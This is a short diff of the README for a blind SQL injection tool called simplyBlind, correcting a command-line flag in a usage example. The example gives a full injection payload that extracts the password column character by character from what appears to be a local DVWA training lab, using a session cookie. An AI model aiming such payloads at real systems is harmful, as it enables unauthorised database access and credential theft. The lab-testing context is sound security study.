@@ -29,7 +29,7 @@ python simplyBlind.py quick -m sc -s 200 -p "1' AND BINARY SUBSTR(password, \!I,
 
 Regex:
 ``` shell
-python simplyBlind.py quick --m reg --regex "User ID exists in the database" -p "2' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
+python simplyBlind.py quick -m reg --regex "User ID exists in the database" -p "2' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
 ```
 ![regex](img/regex.gif)  
 
